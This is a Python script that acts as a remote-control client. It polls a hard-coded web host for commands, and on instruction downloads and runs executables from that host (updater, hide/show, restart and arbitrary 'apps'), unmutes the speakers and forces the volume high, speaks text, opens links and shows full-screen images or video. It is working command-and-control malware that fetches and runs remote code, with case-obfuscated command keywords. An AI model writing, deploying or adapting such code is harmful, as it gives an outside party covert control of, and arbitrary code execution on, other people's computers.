import requests as rq
from time import sleep
from threading import Thread
from webbrowser import open as wbopen
import pygame
import os
import pyttsx3
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
import cv2
url = "https://ms32-sha2.onrender.com/"
terminate = False
HWND = 0
SW_HIDE = 0
SW_SHOW = 5
#compile left
try:
    pygame.mixer.init()
except:
    pass
if not os.path.exists("effects"):
    os.mkdir("effects")
if not os.path.exists("assets"):
    os.mkdir("assets")
def hit(url:str):
    try:
        if not terminate:
            return rq.get(url,stream=True)
    except:
        return "none"

def say(txt):
    engine = pyttsx3.init()
    engine.setProperty("rate",engine.getProperty('rate')-40)
    engine.say(txt)
    engine.runAndWait()

def playfunc(fp):
    if not os.path.exists(os.path.join("effects",fp)):
        audi = hit(url+f"static/sounds/{fp}")
        with open(os.path.join("effects",fp), "xb") as file:
            downloaded_size = 0
            for chunk in audi.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
    # try:                
    CoInitialize()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = interface.QueryInterface(IAudioEndpointVolume)
    
    if volume.GetMute():
        volume.SetMute(0, None)
    vmin, vmax, _ = volume.GetVolumeRange()
    target = vmin + (95 / 100.0) * (vmax - vmin)
    target = max(min(target, vmax), vmin)
    volume.SetMasterVolumeLevel(target, None)
    # except:
    #     pass
    CoUninitialize()
    pygame.mixer.music.load(f"effects/{fp}")
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():
        continue               
    
def update():
    global terminate
    exe = hit(url+"static/updates/ms32-1.exe")
    total_size = int(exe.headers.get('content-length', 0))
    with open("ms32-1.exe", "xb") as file:
        downloaded_size = 0
        for chunk in exe.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
                downloaded_size += len(chunk)
    exe = hit(url+"static/updates/updater.exe")
    with open("updater.exe", "wb") as file:
        downloaded_size = 0
        for chunk in exe.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
                downloaded_size += len(chunk)
    os.startfile("updater.exe")
    terminate=True
    return

def hide(state):
    if state:
        if not os.path.exists("hide.exe"):
            exe = hit(url+"static/updates/hide.exe")
            with open("hide.exe", "xb") as file:
                downloaded_size = 0
                for chunk in exe.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
        os.startfile("hide.exe")
    else:
        if not os.path.exists("show.exe"):
            exe = hit(url+"static/updates/show.exe")
            with open("show.exe", "xb") as file:
                downloaded_size = 0
                for chunk in exe.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
        os.startfile("show.exe")

def restart():
    global terminate
    if not os.path.exists("restart.exe"):
        exe = hit(url+"static/updates/restart.exe")
        with open("restart.exe", "xb") as file:
            downloaded_size = 0
            for chunk in exe.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
    os.startfile("restart.exe")
    terminate = True

def run(name):
    exe = hit(url+f"static/apps/{name}")
    with open(f"{name}", "xb") as file:
        downloaded_size = 0
        for chunk in exe.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
                downloaded_size += len(chunk)
    os.startfile(name)

def display(fp):
    asset = hit(url+f"static/images/{fp}")
    try:
        with open(f"assets/{fp}", "xb") as file:
            downloaded_size = 0
            for chunk in asset.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
    except FileExistsError:pass
    file_path = f"assets/{fp}"
    cv2.namedWindow("Gok GOk", cv2.WND_PROP_FULLSCREEN)
    cv2.setWindowProperty("Gok GOk", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
    
    if file_path.lower().endswith(('.mp4', '.avi', '.mov', '.mkv')):
        video_capture = cv2.VideoCapture(file_path)
        if not video_capture.isOpened():
            return
        fps = video_capture.get(cv2.CAP_PROP_FPS)
        if fps == 0:
            fps = 30
        frame_delay = int(530 / fps)
        while True:
            ret, frame = video_capture.read()
            if not ret:
                break
            screen_width = cv2.getWindowImageRect("Gok GOk")[2]
            screen_height = cv2.getWindowImageRect("Gok GOk")[3]
            frame = cv2.resize(frame, (screen_width, screen_height))
            cv2.imshow("Gok GOk", frame)
            cv2.waitKey(frame_delay)
        video_capture.release()
        sleep(1.5)
    elif file_path.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp')):
        image = cv2.imread(file_path)
        if image is None:
            return

        screen_width = cv2.getWindowImageRect("Gok GOk")[2]
        screen_height = cv2.getWindowImageRect("Gok GOk")[3]
        image = cv2.resize(image, (screen_width, screen_height))

        cv2.imshow("Gok GOk", image)

        cv2.waitKey(1)
        sleep(8)
    else:
        pass
    cv2.destroyAllWindows()

def main():
    while not terminate:
        sleep(0.5)
        cmd = hit(url+"command")
        if type(cmd) != str:
            cmd = cmd.content.decode("utf-8")
        print(cmd)
        if "hIdE on" in cmd:
            hide(True)
        elif "hIdE off" in cmd:
            hide(False)
        elif "rEsTaRt" in cmd:
            restart()
        elif "sPeAk" in cmd:
            txt = cmd.replace("sPeAk","")
            saying = Thread(target=say,args=(txt,))
            saying.start()
        elif "oPeN" in cmd:
            link = cmd.replace("oPeN ","")
            wbopen(link)
        elif "pLaY" in cmd:
            fp = cmd.replace("pLaY ","")
            Thread(target=playfunc,args=(fp,)).start()
        elif "uPdAtE" in cmd:
            update()
        elif "rUn" in cmd:
            app_name = cmd.replace("rUn ","")
            Thread(target=run,args=(app_name,)).start()
        elif "iMaGe" in cmd:
            ifp = cmd.replace("iMaGe ","")
            Thread(target=display,args=(ifp,)).start()

main()
